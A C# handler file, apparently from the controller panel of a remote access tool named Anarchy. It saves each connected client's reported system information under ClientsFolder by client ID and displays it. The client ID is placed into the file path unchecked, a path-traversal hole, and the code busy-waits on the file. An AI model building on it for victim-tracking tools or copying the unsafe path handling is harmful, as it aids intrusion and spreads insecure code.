using System;
using System.IO;
using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleInformation
    {
        public void AddToInformationList(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string text;
                text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString + "\\Information");
                string path;
                path = text + "\\Information.txt";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                }
                File.WriteAllText(path, unpack_msgpack.ForcePathObject("InforMation").AsString);
                while (!File.Exists(path))
                {
                }
                new FrmInfo(Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString + "\\Information\\Information.txt")).ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
